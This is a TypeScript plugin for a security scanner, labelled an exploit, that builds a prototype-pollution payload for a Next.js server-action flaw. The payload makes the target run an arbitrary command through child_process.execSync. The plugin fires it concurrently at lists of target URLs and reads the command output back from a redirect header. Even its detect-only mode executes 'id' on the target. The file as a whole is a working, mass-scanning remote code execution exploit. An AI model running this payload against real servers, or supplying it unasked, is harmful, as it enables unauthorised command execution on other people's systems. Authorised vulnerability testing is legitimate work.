/**
 * Next.js Prototype Pollution RCE Scanner
 * 
 * @plugin nextjs_rce_scanner
 * @name Next.js RCE Scanner
 * @version 1.0.0
 * @author Sentinel Team
 * @category exploit
 * @default_severity critical
 * @tags nextjs, rce, prototype-pollution, cve
 * @description Detect and exploit Next.js prototype pollution RCE vulnerability
 */

/**
 * Tool input parameters
 */
interface ToolInput {
    targets: string[];
    command?: string;
    detectOnly?: boolean;
    concurrency?: number;
    timeout?: number;
}

interface ToolOutput {
    success: boolean;
    data?: {
        results: Array<{
            url: string;
            vulnerable: boolean;
            commandOutput?: string;
            error?: string;
            responseTime?: number;
        }>;
        summary: {
            total: number;
            vulnerable: number;
            scanned: number;
            concurrency: number;
        };
    };
    error?: string;
}

/**
 * 【方案2】导出参数 Schema 函数
 * 
 * 插件自己定义需要的参数，引擎加载后调用此函数获取。
 */
export function get_input_schema() {
    return {
        type: "object",
        required: ["targets"],
        properties: {
            targets: {
                type: "array",
                items: { type: "string" },
                description: "目标域名或URL列表，如 ['https://example.com', 'target.com']"
            },
            command: {
                type: "string",
                description: "要执行的命令（可选，默认为 'id'）",
                default: "id"
            },
            detectOnly: {
                type: "boolean",
                description: "是否只检测不执行命令（true=仅检测，false=执行命令）",
                default: false
            },
            concurrency: {
                type: "integer",
                description: "并发请求数",
                default: 5,
                minimum: 1,
                maximum: 50
            },
            timeout: {
                type: "integer",
                description: "请求超时时间（毫秒）",
                default: 5000,
                minimum: 1000,
                maximum: 30000
            }
        }
    };
}

// 绑定到 globalThis
globalThis.get_input_schema = get_input_schema;

/**
 * Generate exploit payload
 * @param command Command to execute
 * @returns Multipart/form-data request body with payload
 */
function generateExploitPayload(command: string): string {
    const boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad";

    const payload = {
        then: "$1:__proto__:then",
        status: "resolved_model",
        reason: -1,
        value: '{"then":"$B1337"}',
        _response: {
            _prefix: `var res=process.mainModule.require('child_process').execSync('${command}').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: \`NEXT_REDIRECT;push;/login?a=\${res};307;\`});`,
            _chunks: "$Q2",
            _formData: {
                get: "$1:constructor:constructor"
            }
        }
    };

    const parts = [
        `--${boundary}`,
        'Content-Disposition: form-data; name="0"',
        '',
        JSON.stringify(payload),
        `--${boundary}`,
        'Content-Disposition: form-data; name="1"',
        '',
        '"$@0"',
        `--${boundary}`,
        'Content-Disposition: form-data; name="2"',
        '',
        '[]',
        `--${boundary}--`,
        ''
    ];

    return parts.join('\r\n');
}

/**
 * Parse x-action-redirect header to extract command output
 */
function parseRedirectHeader(redirectHeader: string | null): string | null {
    if (!redirectHeader) return null;

    try {
        const match = redirectHeader.match(/\/login\?a=([^;]+)/);
        if (match && match[1]) {
            return decodeURIComponent(match[1].trim());
        }
        return null;
    } catch {
        return null;
    }
}

/**
 * Parse response to extract command execution result
 */
function parseCommandOutput(responseText: string, redirectHeader: string | null): string | null {
    // Prefer header parsing (more reliable)
    const headerResult = parseRedirectHeader(redirectHeader);
    if (headerResult) {
        return headerResult;
    }

    try {
        // Fallback: extract from response body
        const redirectMatch = responseText.match(/NEXT_REDIRECT;push;\/login\?a=([^;]+);307/);
        if (redirectMatch && redirectMatch[1]) {
            return decodeURIComponent(redirectMatch[1]);
        }

        const errorMatch = responseText.match(/digest:\s*['"]NEXT_REDIRECT;push;\/login\?a=([^'"]+)['"]/);
        if (errorMatch && errorMatch[1]) {
            return decodeURIComponent(errorMatch[1]);
        }

        if (responseText.includes('VULNERABLE_DETECTED')) {
            return "VULNERABLE_DETECTED";
        }

        return null;
    } catch {
        return null;
    }
}

/**
 * Check if command output indicates successful exploitation
 */
function isExploitSuccessful(output: string | null, command: string): boolean {
    if (!output) return false;

    // id command signature detection
    if (command === 'id' || command.includes('id')) {
        return /uid=\d+/.test(output) || /gid=\d+/.test(output);
    }

    // whoami command signature
    if (command === 'whoami') {
        return output.length > 0 && !output.includes('error') && !output.includes('not found');
    }

    // General detection: has output and not an error message
    return output.length > 0 &&
           output !== "VULNERABLE_DETECTED" &&
           !output.toLowerCase().includes('error') &&
           !output.toLowerCase().includes('not found');
}

/**
 * Send exploit request
 */
async function sendExploitRequest(
    url: string,
    payload: string,
    timeout: number
): Promise<{responseText: string; status: number; responseTime: number; redirectHeader: string | null; error?: string}> {
    const startTime = Date.now();

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Host': new URL(url).host,
                'Next-Action': 'x',
                'X-Nextjs-Request-Id': 'b5dce965',
                'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad',
                'X-Nextjs-Html-Request-Id': 'SSTMXm7OJ_g0Ncx6jpQt9',
                'Content-Length': payload.length.toString(),
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            },
            body: payload,
            // @ts-ignore - timeout may be supported by runtime
            timeout: timeout
        });

        const responseTime = Date.now() - startTime;
        const responseText = await response.text();
        const redirectHeader = response.headers.get('x-action-redirect');

        return {
            responseText,
            status: response.status,
            responseTime,
            redirectHeader
        };
    } catch (error: any) {
        const responseTime = Date.now() - startTime;
        return {
            responseText: '',
            status: 0,
            responseTime,
            redirectHeader: null,
            error: error.message || 'Request failed'
        };
    }
}

/**
 * Normalize URL, return list of URLs to test if no protocol specified
 */
function normalizeTargetUrls(target: string): string[] {
    const trimmed = target.trim();

    if (trimmed.startsWith('http://') || trimmed.startsWith('https://')) {
        return [trimmed];
    }

    // No protocol, test both https and http
    return [`https://${trimmed}`, `http://${trimmed}`];
}

/**
 * Simple batch executor with concurrency control
 */
async function runInBatches<T>(
    tasks: (() => Promise<T>)[],
    batchSize: number
): Promise<void> {
    for (let i = 0; i < tasks.length; i += batchSize) {
        const batch = tasks.slice(i, i + batchSize);
        await Promise.all(batch.map(task => task().catch(() => {})));
    }
}

/**
 * Main analysis function
 */
export async function analyze(input: ToolInput): Promise<ToolOutput> {
    try {
        // Validate input
        if (!input || !input.targets || !Array.isArray(input.targets) || input.targets.length === 0) {
            return {
                success: false,
                error: "Invalid input: targets parameter is required and must be a non-empty array"
            };
        }

        const targets = input.targets;
        const command = input.command || 'id';
        const timeout = input.timeout || 5000;
        const detectOnly = input.detectOnly || false;
        const concurrency = input.concurrency || 5;

        const results: Array<{
            url: string;
            vulnerable: boolean;
            commandOutput?: string;
            responseTime?: number;
        }> = [];

        let scannedCount = 0;

        // Single target scan task
        const scanTarget = async (target: string): Promise<void> => {
            const urlsToTest = normalizeTargetUrls(target);

            for (const targetUrl of urlsToTest) {
                try {
                    // Validate URL format
                    try {
                        new URL(targetUrl);
                    } catch {
                        continue;
                    }

                    scannedCount++;

                    const effectiveCommand = detectOnly ? 'id' : command;
                    const payload = generateExploitPayload(effectiveCommand);
                    const requestResult = await sendExploitRequest(targetUrl, payload, timeout);

                    if (requestResult.error) {
                        continue;
                    }

                    const commandOutput = parseCommandOutput(requestResult.responseText, requestResult.redirectHeader);

                    if (detectOnly) {
                        const vulnerable = isExploitSuccessful(commandOutput, 'id');
                        if (vulnerable) {
                            results.push({
                                url: targetUrl,
                                vulnerable: true,
                                commandOutput: `Vulnerability detected! Command output: ${commandOutput}`,
                                responseTime: requestResult.responseTime
                            });
                            return;
                        }
                    } else {
                        const vulnerable = isExploitSuccessful(commandOutput, command);
                        if (vulnerable) {
                            results.push({
                                url: targetUrl,
                                vulnerable: true,
                                commandOutput: commandOutput,
                                responseTime: requestResult.responseTime
                            });
                            return;
                        }
                    }
                } catch {
                    continue;
                }
            }
        };

        // Create all scan tasks
        const tasks = targets.map(target => () => scanTarget(target));

        // Execute in batches
        await runInBatches(tasks, concurrency);

        // Generate summary
        const summary = {
            total: targets.length,
            vulnerable: results.length,
            scanned: scannedCount,
            concurrency: concurrency
        };

        return {
            success: true,
            data: {
                results,
                summary
            }
        };

    } catch (error: any) {
        return {
            success: false,
            error: error instanceof Error ? error.message : String(error)
        };
    }
}

// Export to globalThis for plugin engine
globalThis.analyze = analyze;

